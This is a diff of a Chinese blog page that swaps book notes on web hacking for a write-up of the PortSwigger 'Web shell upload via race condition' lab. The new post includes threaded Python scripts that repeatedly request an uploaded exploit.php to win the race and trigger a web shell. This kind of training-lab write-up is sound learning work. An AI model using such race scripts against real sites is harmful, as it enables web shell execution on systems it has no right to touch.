@@ -21,21 +21,24 @@
     var CONFIG = {"hostname":"zhangyijian.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":"mac","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="好吧，标题是挺长的。但确实能表达这篇文章是要干嘛。">
+  <meta name="description" content="本文是针对Lab: Web shell upload via race condition编写Python脚本的文档。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Web Application Hacker&#39;s Handbook 读书笔记">
-<meta property="og:url" content="https://zhangyijian.cn/2021/11/23/Notes/Web-Application-Hacker-s-Handbook-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:title" content="竞态条件下的Web shell上传">
+<meta property="og:url" content="https://zhangyijian.cn/2024/03/05/Notes/%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84Web%20shell%E4%B8%8A%E4%BC%A0/index.html">
 <meta property="og:site_name" content="人生边上">
-<meta property="og:description" content="好吧，标题是挺长的。但确实能表达这篇文章是要干嘛。">
+<meta property="og:description" content="本文是针对Lab: Web shell upload via race condition编写Python脚本的文档。">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-11-23T02:13:00.000Z">
-<meta property="article:modified_time" content="2022-05-19T12:27:36.747Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/91Quin/-for-hexo/main/img/202403051932804.png">
+<meta property="article:published_time" content="2024-03-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-05T11:35:38.625Z">
 <meta property="article:author" content="张一剑">
-<meta property="article:tag" content="读书笔记">
+<meta property="article:tag" content="知识&#x2F;cybersecurity">
 <meta property="article:tag" content="Web">
+<meta property="article:tag" content="文件上传">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/91Quin/-for-hexo/main/img/202403051932804.png">
 
-<link rel="canonical" href="https://zhangyijian.cn/2021/11/23/Notes/Web-Application-Hacker-s-Handbook-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">
+<link rel="canonical" href="https://zhangyijian.cn/2024/03/05/Notes/%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84Web%20shell%E4%B8%8A%E4%BC%A0/">
 
 
 <script id="page-configurations">
@@ -48,7 +51,7 @@
   };
 </script>
 
-  <title>Web Application Hacker's Handbook 读书笔记 | 人生边上</title>
+  <title>竞态条件下的Web shell上传 | 人生边上</title>
   
 
 
@@ -153,7 +156,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://zhangyijian.cn/2021/11/23/Notes/Web-Application-Hacker-s-Handbook-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">
+    <link itemprop="mainEntityOfPage" href="https://zhangyijian.cn/2024/03/05/Notes/%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84Web%20shell%E4%B8%8A%E4%BC%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -166,7 +169,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Web Application Hacker's Handbook 读书笔记
+          竞态条件下的Web shell上传
         </h1>
 
         <div class="post-meta">
@@ -175,16 +178,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2021-11-23 10:13:00" itemprop="dateCreated datePublished" datetime="2021-11-23T10:13:00+08:00">2021-11-23</time>
+              <time title="创建时间：2024-03-05 00:00:00 / 修改时间：19:35:38" itemprop="dateCreated datePublished" datetime="2024-03-05T00:00:00+08:00">2024-03-05</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-05-19 20:27:36" itemprop="dateModified" datetime="2022-05-19T20:27:36+08:00">2022-05-19</time>
-              </span>
 
           
 
@@ -197,44 +194,23 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <blockquote>
-<p>好吧，标题是挺长的。但确实能表达这篇文章是要干嘛。</p>
-</blockquote>
+        <p>本文是针对<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition">Lab: Web shell upload via race condition</a>编写Python脚本的文档。</p>
 <span id="more"></span>
-<p>在拿到这本书后，我是像我看那本《数据结构与算法分析》一样，从头一字不漏地开始往后看的。说实话，那些内容有点让我痛苦。xD<br>在经历了长达一个多月的挣扎后，我终于领悟到跳脱这泥潭的方法————我可以跳着看，没必要纠结于前两章。毕竟它们很无趣，对我来说，起码现在是这样。<br>于是我开始了我快乐的第三章之旅。很明显，第三章要比前两章有趣得多，而且对于现在的我的帮助也大得多。显而易见的是，我有很多不懂得地方，而且我也保持了一贯的习惯：在书上瞎画哒。所以我以此作为我书上笔记的补充。</p>
-<h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><h3 id="HTTP-Headers"><a href="#HTTP-Headers" class="headerlink" title="HTTP  Headers"></a>HTTP  Headers</h3><blockquote>
-<p>我在看书时发现Pragma和Cache_Control好像没啥区别。      </p>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000009652182">HTTP缓存</a>这篇文章讲的很细致（吧？）。<br>总的来说：http1.0时期，给client设置缓存有两个字段Pragma和Expires现在是为了向前兼容所以还留着。Pragma的优先级高于Expires。而Expires所定义的缓存时间是相对于服务器上的时间而言的，无法保证和客户端的时间统一。为了解决这个问题，http1.1新增了Cache-Control来定义缓存过期时间。</p>
-<pre class="mermaid">graph TD
-    A[Pragma] --> B[Cache-Control] --> C[Expires]
-    F[优先级]</pre>
-<h3 id="HTTP-Methods"><a href="#HTTP-Methods" class="headerlink" title="HTTP Methods"></a>HTTP Methods</h3><blockquote>
-<p>emmm ,再看到稍后面一点的Web Functionality时重新返回来看了下HTTP Methods这里。对于POST迷惑了。</p>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/630453/what-is-the-difference-between-post-and-put-in-http">POST Vs PUT-来自StackOverflow</a></p>
 <blockquote>
-<p>Better is to choose between PUT and POST based on idempotence of the action.<br>PUT implies putting a resource - completely replacing whatever is available at the given URL with a different thing. By definition, a PUT is idempotent. Do it as many times as you like, and the result is the same. x&#x3D;5 is idempotent. You can PUT a resource whether it previously exists, or not (eg, to Create, or to Update)!<br>POST updates a resource, adds a subsidiary resource, or causes a change. A POST is not idempotent, in the way that x++ is not idempotent.</p>
+<p>如上所述，写这篇文章旨在为Python脚本提供说明文档。虽然相应Lab有题解，但题解使用Burp suite <a target="_blank" rel="noopener" href="https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988">Turbo Intruder</a>扩展。我在搜索教程后发现所有题解都使用solution建议的解法。我认为自行Python脚本可以更简便地解决，同时可以锻炼Python代码能力。因此希望在此提供一种不同的解法。</p>
 </blockquote>
-<p>涉及幂等性这块，之前还真没觉得POST和PUT功能有点重复。现在这么一对比，有点懂了POST的功能。<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Idempotence">Idempotence (UK: &#x2F;ˌɪdɛmˈpoʊtəns&#x2F;,[1] US: &#x2F;ˌaɪdəm-&#x2F;)[2] is the property of certain operations in mathematics and computer science whereby they can be applied multiple times without changing the result beyond the initial application.</a></p>
 <blockquote>
-<p>“多次运算而不改变最初的结果” （ 如’x&#x3D;5’)</p>
+<p>by the way ,事实上solution中提供的也是Python脚本</p>
 </blockquote>
-<p>GET不过是请求信息的，给server的Parameters都在Query String里了。容易泄露。无论咋样，一样的Parameters，Server给的都是一样的。但POST是用于modify and update a resource。</p>
-<blockquote>
-<p>插一嘴，没看过RFC，上来看Stackoverflow问题中贴的这段直接给我干懵了<br><a target="_blank" rel="noopener" href="https://www.rfc-editor.org/rfc/rfc2616#section-9.5">The POST method is used to request that the origin server accept the entity enclosed in the request as a new subordinate of the resource identified by the Request-URI in the Request-Line.</a><br>这啥啊！</p>
-</blockquote>
-<h2 id="第九章"><a href="#第九章" class="headerlink" title="第九章"></a>第九章</h2><blockquote>
-<p>是的，我又跳了</p>
-</blockquote>
-<p>我看我记的时间上写的是5.6开始看的，现在5.19，看了接近一半。我也感觉得到我的英语阅读速度大幅提高。为什么跳到第九章来了呢？主要是我当时第三章也没看完，我就又跳了。跳哪呢，跳第四章”Mapping the Application”那儿去看去了。emmmmm，说是还行吧也还行，但是说实话动手的地方儿不是很多，兴致阑珊。我能受得了这个气？<del>我刚学得擒拿术</del>然后就来到了第九章。┑(￣Д ￣)┍</p>
-<p>第九章讲SQLI(SQL Injection)的。他一开始说了个</p>
-<blockquote>
-<p>Because of how interpreted languages are excuted,a family of vulnerabilities known as <em><strong>code injection</strong></em> arises.</p>
-</blockquote>
-<p>我认为他这个 <em><strong>Code</strong></em> <em><strong>Injection</strong></em> 提的很有意思。这么一想那些payload不也是这种分类下吗？（<del>虽然我没用过、甚至都没大看过payload</del>）很妙很妙。</p>
-<p>剩下的就比较零散了，他讲得尽力比较系统，也讲了蛮多 <em><strong>tricks</strong></em> 的。但是实验虽然有，有点不尽人意啊。他把实验改了，这也是我第一次上他网站。说啥啥啥时效性不行巴拉巴拉，第三版不出了，整了个Web Academic。是免费的，我很开心很感动。虽然不知道原来的Lab啥样，但现在的Lab就感觉跟填空题一样，后端不知道是不是真的数据库。当然我只做了一个Lab，再做做才能有发言权。这个Web Academic也没书本详细，再出第三版不挺好。（<del>如果是因为我白嫖的原因，我致歉。诚恳地致歉。</del>）</p>
-<p>当时觉得他实验不行的时候就去找环境了，才发现docker是真方便。pull一下run就完了。用docker搭了DVWA和OWASP JuiceShop 的环境。感慨真是美好。</p>
+<p>要实现的Python脚本仅仅是需要不断向host发送<code>GET</code>requests ,然后筛选出状态码为200的response即可。</p>
+<p>这里要使用Python Requests库：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install requests</span><br></pre></td></tr></table></figure>
+<p>先传一个正常的看下目录：<code>files/avatars/Lenna_(test_image).png</code></p>
+<p>我完成的第一版代码结果并没有结果，我想可能是Python请求的没那么快（？</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import argparse</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request</span>():</span><br><span class="line">    <span class="built_in">dir</span> = <span class="string">&quot;/files/avatars/exploit.php&quot;</span></span><br><span class="line">    url = <span class="string">&quot;https://xxxx.web-security-academy.net&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = requests.get(url + <span class="built_in">dir</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    request()</span><br></pre></td></tr></table></figure>
+<p>我参考<a target="_blank" rel="noopener" href="https://github.com/666reda/race-condition/blob/master/race-condition.py">别的代码</a>，想是不是可以开几个线程？<br><img src="https://raw.githubusercontent.com/91Quin/-for-hexo/main/img/202403051932804.png">力大砖飞,开了七个线程</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import argparse</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request</span>():</span><br><span class="line">    <span class="built_in">dir</span> = <span class="string">&quot;/files/avatars/exploit.php&quot;</span></span><br><span class="line">    url = <span class="string">&quot;https://xxxxx.web-security-academy.net&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = requests.get(url + <span class="built_in">dir</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    thread1 = threading.Thread(target=request)</span><br><span class="line">    thread1.start()</span><br><span class="line">    thread2 = threading.Thread(target=request)</span><br><span class="line">    thread2.start()</span><br><span class="line">    thread3 = threading.Thread(target=request)</span><br><span class="line">    thread3.start()</span><br><span class="line">    thread4 = threading.Thread(target=request)</span><br><span class="line">    thread4.start()</span><br><span class="line">    thread5 = threading.Thread(target=request)</span><br><span class="line">    thread5.start()</span><br><span class="line">    thread6 = threading.Thread(target=request)</span><br><span class="line">    thread6.start()</span><br><span class="line">    thread7 = threading.Thread(target=request)</span><br><span class="line">    thread7.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -244,8 +220,9 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" rel="tag"># 读书笔记</a>
+              <a href="/tags/%E7%9F%A5%E8%AF%86-cybersecurity/" rel="tag"># 知识/cybersecurity</a>
               <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag"># 文件上传</a>
           </div>
 
         
@@ -254,13 +231,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/05/19/20210519/" rel="prev" title="成为猛男，练的猛就够了吗？">
-      <i class="fa fa-chevron-left"></i> 成为猛男，练的猛就够了吗？
+    <a href="/2024/02/27/Notes/Insecure%20Deserialization/" rel="prev" title="Portswigger 不安全的反序列化">
+      <i class="fa fa-chevron-left"></i> Portswigger 不安全的反序列化
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2022/04/18/Notes/Hacker%20Self-Development/" rel="next" title="Hacker Self-Development">
-      Hacker Self-Development <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -319,7 +293,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0"><span class="nav-number">1.</span> <span class="nav-text">第三章</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-Headers"><span class="nav-number">1.1.</span> <span class="nav-text">HTTP  Headers</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-Methods"><span class="nav-number">1.2.</span> <span class="nav-text">HTTP Methods</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B9%9D%E7%AB%A0"><span class="nav-number">2.</span> <span class="nav-text">第九章</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
